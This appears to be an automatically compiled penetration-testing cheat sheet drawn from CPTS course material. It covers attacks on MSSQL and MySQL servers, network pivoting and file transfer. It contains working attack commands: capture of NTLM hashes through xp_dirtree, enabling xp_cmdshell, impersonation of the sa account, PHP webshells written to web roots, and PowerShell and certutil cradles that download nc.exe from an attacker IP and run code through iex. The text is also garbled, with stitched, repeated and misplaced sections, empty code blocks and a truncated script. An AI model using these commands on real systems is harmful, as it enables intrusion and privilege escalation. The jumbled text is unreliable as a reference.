<a id="technique-capture-mssql-service-hash"></a>
## Capture MSSQL Service Hash

Aliases: —  
Tags: abuse, crack, hash, host, mssql, relay, service, smb, sql, sudo  
Category: Databases / Attacking SQL Databases  
OS: Linux, Windows  
Service: SMB, mssql  
Ports: 139, 445, 1433

### Remember this attack when

- When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
- To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries: XPDIRTREE Hash Stealing XPSUBDIRS Hash Stealing If the service account has access to our server, we will obtain its hash.

### Prerequisites

- To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries: XPDIRTREE Hash Stealing XPSUBDIRS Hash Stealing If the service account has access to our server, we will obtain its hash.

<a id="technique-communicate-with-other-databases-with-mssql"></a>
## Communicate with Other Databases with MSSQL

Aliases: —  
Tags: attack, mssql, mysql, oracle, postgresql, sql  
Category: Databases / Attacking SQL Databases  
OS: Cross-platform / not specified  
Service: mssql, mysql, oracle, postgresql  
Ports: 1433, 1521, 3306, 5432

### Remember this attack when

- If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server.
- If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.
- Let's see how we can identify and execute queries on linked servers.

### Prerequisites

- If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server.
- Administrators can configure a linked server using credentials from the remote server.
- If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.

### Enumeration / Detection

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

### Exploitation

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------

(1 rows affected)
```

### What success looks like

- If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server.
- Identify linked Servers in MSSQL As we can see in the query's output, we have the name of the server and the column isremote, where 1 means is a remote server, and 0 is a linked server.
- We can see sysservers Transact-SQL for more information.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Attacking SQL Databases` → re-enumerate with the gained access.

### Common problems / Why it fails

- Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote.

### Remember this attack when

- The Oracle DBSNMP service also uses a default password, dbsnmp that we should remember when we come across this one.
- Another example would be that many organizations still use the finger service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.
- The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service.

### Prerequisites

- Another example would be that many organizations still use the finger service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.
- It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

<a id="technique-execute-commands"></a>
## Execute Commands

Aliases: —  
Tags: mssql, mysql, service, sql  
Category: Databases / Attacking SQL Databases  
OS: Windows  
Service: mssql, mysql  
Ports: 1433, 3306

### Remember this attack when

- Command execution is one of the most desired capabilities when attacking common services because it allows us to control the operating system.
- If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.
- MSSQL has a extended stored procedures called xpcmdshell which allow us to execute system commands using SQL.

### Prerequisites

- If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.
- xpcmdshell can be enabled and disabled by using the Policy-Based Management or by executing spconfigure - The Windows process spawned by xpcmdshell has the same security rights as the SQL Server service account - xpcmdshell operates synchronously.
- However, besides those methods there are also additional functionalities that can be used like the xpregwrite command that is used to elevate privileges by creating new entries in the Windows registry.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

```MSSQL
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.

GO
```

### Prerequisites

### Enumeration / Detection

<a id="technique-impersonate-existing-users-with-mssql"></a>
## Impersonate Existing Users with MSSQL

Aliases: —  
Tags: mssql, sql  
Category: Databases / Attacking SQL Databases  
OS: Cross-platform / not specified  
Service: mssql  
Ports: 1433

### Remember this attack when

- SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.
- First, we need to identify users that we can impersonate.
- If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error.

### Prerequisites

- SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.
- Let's explore how the IMPERSONATE privilege can lead to privilege escalation in SQL Server.
- First, we need to identify users that we can impersonate.

### Enumeration / Detection

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

### Exploitation

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

### What success looks like

- Impersonating the SA User Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database.
- If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error.
- We can now execute any command as a sysadmin as the returned value 1 indicates.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Attacking SQL Databases` → re-enumerate with the gained access.

### Common problems / Why it fails

- If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

### Useful commands

```cmd-session
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id

6> GO

-----------------------------------------------

ben
valentin

(3 rows affected)
```

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

(1 rows affected)

-----------

```

OS: Linux, Windows

### Remember this attack when

- It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET.
- This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database.
- To find if and where the client is located on our host, we can use the following command: MSSQL Databases MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server.

<a id="technique-mysql"></a>
## MySQL

Aliases: —  
Tags: mysql, oracle, sql  
Category: Databases / MySQL  
OS: Cross-platform, Linux  
Service: mysql, oracle  
Ports: 1521, 3306

### Remember this attack when

- It is often combined with a Linux OS, PHP, and an Apache web server and is also known in this combination as LAMP) (Linux, Apache, MySQL, PHP), or when using Nginx, as LEMP.
- The web application informs the user if an error occurs during processing, which various SQL injections can provoke.
- The web application sends the generated information back to the client if the data is processed correctly.

### Prerequisites

- In a web hosting with MySQL database, this serves as a central instance in which content required by PHP scripts is stored.
- This information can be the data extracts from a table or records needed for further processing with logins, search functions, etc.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- Depending on the use of the database, access is possible via an internal network or the public Internet.
- WordPress stores all created posts, usernames, and passwords in their own database, which is only accessible from the localhost.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `MySQL` → re-enumerate with the gained access.

### Common problems / Why it fails

- The web application informs the user if an error occurs during processing, which various SQL injections can provoke.
- Often, these error descriptions contain important information and confirm, among other things, that the web application interacts with the database in a different way than the developers intended.

<a id="technique-the-concept-of-the-attack-databases"></a>
## The Concept of the Attack — Databases

Aliases: —  
Tags: attack, hash, host, mssql, password, relay, service, smb, sql  
Category: Databases / Latest SQL Vulnerabilities  
OS: Windows  
Service: SMB, mssql  
Ports: 139, 445, 1433

### Remember this attack when

- We will focus on the undocumented MSSQL server function called xpdirtree for this vulnerability.
- The interesting thing is that the MSSQL function xpdirtree is not directly a vulnerability but takes advantage of the authentication mechanism of SMB.
- When we try to access a shared folder on the network with a Windows host, this Windows host automatically sends an NTLMv2 hash for authentication.

### Prerequisites

- The Concept of Attacks Diagram showing flow from Source to Processes, Privileges, and Destination with related components.
- This includes an SMB Relay attack where we "replay" the hash to log into other systems where the account has local admin privileges or cracking this hash on our local system.
- We could, however, possibly gain local admin to another host and then steal credentials that could be re-used to gain local admin access to the original system where the NTLMv2 hash originated from.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- When we try to access a shared folder on the network with a Windows host, this Windows host automatically sends an NTLMv2 hash for authentication.
- Successful cracking would allow us to see and use the password in cleartext.
- A successful SMB Relay attack would grant us admin rights on another host in the network, but not necessarily the host where the hash originated because Microsoft patched an older flaw that allowed an SMB Relay back to the originating host.

<a id="technique-write-local-files"></a>
## Write Local Files

Aliases: —  
Tags: mssql, mysql, sql  
Category: Databases / Attacking SQL Databases  
OS: Cross-platform  
Service: mssql, mysql  
Ports: 1433, 3306

### Remember this attack when

- MySQL does not have a stored procedure like xpcmdshell, but we can achieve command execution if we write to a location in the file system that can execute our commands.
- If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory.
- securefilepriv may be set as follows: - If empty, the variable has no effect, which is not a secure setting.

### Prerequisites

- If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory.
- These operations are permitted only to users who have the FILE privilege.
- The directory must exist; the server does not create it.

### Enumeration / Detection

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Exploitation

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

### What success looks like

- MySQL does not have a stored procedure like xpcmdshell, but we can achieve command execution if we write to a location in the file system that can execute our commands.

### Remember this attack when

- Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining.

<a id="technique-ip-addressing-nics"></a>
## IP Addressing & NICs

Aliases: —  
Tags: attack, dns, host, tunnel  
Category: Pivoting / Tunneling / The Networking Behind Pivoting  
OS: Linux, Windows  
Service: DNS  
Ports: 53

### Remember this attack when

- If it doesn't have one, it is not on a network.
- A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to communicate on various networks.
- Identifying pivoting opportunities will often depend on the specific IPs assigned to the hosts we compromise because they can indicate the networks compromised hosts can reach.

### Prerequisites

- Keep in mind that these lab networks are not reachable without having a tunnel established.
- At the time of writing, anyone that wants to communicate over the Internet must have at least one public IP address assigned to an interface on the network appliance that connects to the physical infrastructure connecting to the Internet.
- In the context of pivoting, we need to be mindful of what networks a host we land on can reach, so documenting as much IP addressing information as possible on an engagement can prove helpful.

Aliases: —  
Tags: domain, host, http, https, pivot, port, scan, ssh

### Remember this attack when

- Check out these two explanations when time permits: Palo Alto Network's Explanation MITRE's Explanation One practical example of Lateral Movement would be: During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account.
- The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.
- Tunneling We often find ourselves using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected.

### Prerequisites

- Lateral Movement Lateral movement can be described as a technique used to further our access to additional hosts, applications, and services within a network environment.
- Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges.
- Lateral Movement often enables privilege escalation across hosts.

## Meterpreter Tunneling & Port Forwarding

Aliases: —  
Tags: attack, dns, host, meterpreter, payload, pivot, port, shell, ssh  
Category: Pivoting / Tunneling / Meterpreter Tunneling & Port Forwarding  
OS: Cross-platform, Linux, Windows  
Service: DNS, SSH  
Ports: 22, 53

### Remember this attack when

- So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network.
- Ping Sweep For Loop on Linux Pivot Hosts Ping Sweep For Loop Using CMD Ping Sweep Using PowerShell Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks.
- There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies.

### Prerequisites

- Executing the Payload on the Pivot Host We need to make sure the Meterpreter session is successfully established upon executing the payload.
- Adding a Line to proxychains.conf if Needed Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
- Finally, we need to tell our socksproxy module to route all the traffic via our Meterpreter session.

Aliases: —

Category: Pivoting / Tunneling / Meterpreter Tunneling & Port Forwarding

Service: Not service-specific

### Remember this attack when

- Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.
- From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised.
- This allows us to view any sessions a host has established.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```shell-session
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

## Routing

Aliases: —  
Tags: attack, forward, host, pivot  
Category: Pivoting / Tunneling / The Networking Behind Pivoting  
OS: Linux, Windows  
Service: Not service-specific

### Remember this attack when

- It is common to think of a network appliance that connects us to the Internet when thinking about a router, but technically any computer can become a router and participate in routing.
- One way we will see this is through the use of AutoRoute, which allows our attack box to have routes to target networks that are reachable through a pivot host.
- When a packet is created and has a destination before it leaves the computer, the routing table is used to decide where to send it.

### Prerequisites

- Some of the challenges we will face in this module require us to make a pivot host route traffic to another network.
- One way we will see this is through the use of AutoRoute, which allows our attack box to have routes to target networks that are reachable through a pivot host.
- When looking for opportunities to pivot, it can be helpful to look at the hosts' routing table to identify which networks we may be able to reach or which routes we may need to add.

## SOCKS5 Tunneling with Chisel

Aliases: Setting Up & Using Chisel, Chisel Reverse Pivot  
Tags: attack, chisel, domain, forward, host, http, password, pivot, port, rdp, ssh, sudo, transfer, tunnel  
Category: Pivoting / Tunneling / SOCKS5 Tunneling with Chisel  
OS: Cross-platform, Linux  
Service: HTTP, RDP, SSH  
Ports: 22, 80, 3389

### Remember this attack when

- If we do not have Chisel on our attack host, we can clone the project repo using the command directly below: Cloning Chisel We will need the programming language Go installed on our system to build the Chisel binary.
- When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of chisel , which can be found in the Releases section of the GitHub repository.
- In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

### Prerequisites

- Before we can use Chisel, we need to have it on our attack host.
- If we do not have Chisel on our attack host, we can clone the project repo using the command directly below: Cloning Chisel We will need the programming language Go installed on our system to build the Chisel binary.
- When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed.

### Enumeration / Detection

### What success looks like

- This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments.
- Running the Chisel Server on the Pivot Host The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host.
- Connecting to the Chisel Server As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `SOCKS5 Tunneling with Chisel` → re-enumerate with the gained access.

### Common problems / Why it fails

- Note: Depending on the version of the glibc library installed on both (target and workstation) systems, there might be discrepancies that could result in an error.
- Note: If you are getting an error message with chisel on the target, try with a different version .

## SSH Dynamic Port Forwarding / SOCKS

Aliases: Dynamic Port Forwarding with SSH and SOCKS Tunneling, Port Forwarding in Context, SSH Local Port Forwarding, Setting up to Pivot  
Tags: attack, bypass, dns, forward, host, http, https, mysql, nmap, pivot, port, rdp, scan, service, ssh  
Category: Pivoting / Tunneling / Dynamic Port Forwarding with SSH and SOCKS Tunneling  
OS: Cross-platform, Linux, Windows  
Service: DNS, HTTP, HTTPS, RDP, SSH, mysql  
Ports: 22, 53, 80, 443, 3306, 3389

### Remember this attack when

- Port forwarding is a technique that allows us to redirect a communication request from one port to another.
- Be sure to focus on understanding the concept, and you will find the diagrams will prove very useful!
- A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding.

### Prerequisites

- Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050.
- To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at /etc/proxychains.conf.
- We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.

### What success looks like

- SSH listens on local port 1234, forwards traffic to MySQL on localhost:3306, and returns via port 22.
- Scanning the Pivot Target The Nmap output shows that the SSH port is open.
- To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port 1234 and access it locally.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Dynamic Port Forwarding with SSH and SOCKS Tunneling` → re-enumerate with the gained access.

### Common problems / Why it fails

- We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network.
- Let's take an example of the below image where we have a NAT'd network of 172.16.5.0/23, which we cannot access directly.
- The reason for this is that proxychains cannot understand partial packets.

### Variants

- Dynamic Port Forwarding with SSH and SOCKS Tunneling, Port Forwarding in Context, SSH Local Port Forwarding, Setting up to Pivot

Aliases: —

OS: Linux, Windows  
Service: SSH  
Ports: 22

### Remember this attack when

- ---- Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed.
- If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory.
- We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.

### Prerequisites

- The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY.
- Imagine that we are on a pentest and gain access to a Windows machine.
- We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed.

## SSH Pivoting with Sshuttle

Aliases: —  
Tags: dns, host, https, nmap, pivot, rdp, ssh, sshuttle, sudo  
Category: Pivoting / Tunneling / SSH Pivoting with sshuttle  
OS: Cross-platform, Linux, Windows  
Service: DNS, HTTPS, RDP, SSH  
Ports: 22, 53, 443, 3389

### Remember this attack when

- ---- Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.

### Prerequisites

- ---- Sshuttle is another tool written in Python which removes the need to configure proxychains.
- One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts.
- Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

## SSH Remote Reverse Port Forwarding

Aliases: Remote/Reverse Port Forwarding with SSH  
Tags: attack, forward, host, http, https, pivot, port, rdp, service, ssh  
Category: Pivoting / Tunneling / Remote/Reverse Port Forwarding with SSH  
OS: Cross-platform, Linux, Windows  
Service: HTTP, HTTPS, RDP, SSH  
Ports: 22, 80, 443, 3389

### Remember this attack when

- But what happens if we try to gain a reverse shell?
- If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).
- There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### What success looks like

- But what happens if we try to gain a reverse shell?
- If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).
- To gain a Meterpreter shell on Windows, we will create a Meterpreter HTTPS payload using msfvenom, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (172.16.5.129).

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Remote/Reverse Port Forwarding with SSH` → re-enumerate with the gained access.

### Common problems / Why it fails

- You might want to upload/download files (when the RDP clipboard is disabled), use exploits or low-level Windows API using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in Windows executables.

- Remote/Reverse Port Forwarding with SSH

## Base64 Encoding / Decoding

Aliases: —  
Tags: hash, ssh, transfer, upload  
Category: File Transfer / Linux File Transfer Methods  
OS: Cross-platform, Linux  
Service: SSH  
Ports: 22

### Remember this attack when

- If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation.
- Linux - Decode the File Finally, we can confirm if the file was transferred successfully using the md5sum command.

### Prerequisites

- Depending on the file size we want to transfer, we can use a method that does not require network communication.
- If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation.

```shell-session
4e301756a07ded0a2dd6953abf015278  id_rsa
```

```shell-session
[!bash!]$ cat id_rsa |base64 -w 0;echo


```

### Exploitation

```shell-session
[!bash!]$ echo -n '' | base64 -d > id_rsa
```

### What success looks like

- If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation.
- Pwnbox - Check File MD5 hash We use cat to print the file content, and base64 encode the output using a pipe |.
- Linux - Decode the File Finally, we can confirm if the file was transferred successfully using the md5sum command.

<a id="technique-changing-user-agent"></a>
## Changing User Agent

Aliases: —  
Tags: host, http, powershell  
Category: File Transfer / Evading Detection  
OS: Cross-platform, Linux, Windows  
Service: HTTP  
Ports: 80

### Remember this attack when

- If diligent administrators or defenders have blacklisted any of these User Agents, Invoke-WebRequest contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari.
- For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```powershell-session
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

### Exploitation

```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

<a id="technique-detection"></a>
## Detection

Aliases: —  
Tags: attack, bypass, curl, http, nmap, powershell, transfer  
Category: File Transfer / Detection  
OS: Cross-platform, Windows  
Service: HTTP  
Ports: 80

### Remember this attack when

- However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.
- HTTP clients are most readily recognized by their user agent string, which the server uses to identify which HTTP client is connecting to it, for example, Firefox, Chrome, etc.
- User agents are not only used to identify web browsers, but anything acting as an HTTP client and connecting to a web server via HTTP can have a user agent string (i.e., cURL, a custom Python script, or common tools such as sqlmap, or Nmap).

### Prerequisites

- Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information.
- There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser.

### Enumeration / Detection

```powershell-session
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

```powershell-session
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```

```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

### Exploitation

```shell-session
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

```powershell-session
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

```shell-session
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

```powershell-session
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```

```shell-session
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

```cmd-session
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

### What success looks like

## File Encryption on Windows

Aliases: —  
Tags: host, password, powershell, transfer  
Category: File Transfer / Protected File Transfers  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- The target behavior or access described in the cited `Protected File Transfers` section is present.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```powershell-session

.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs the decrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
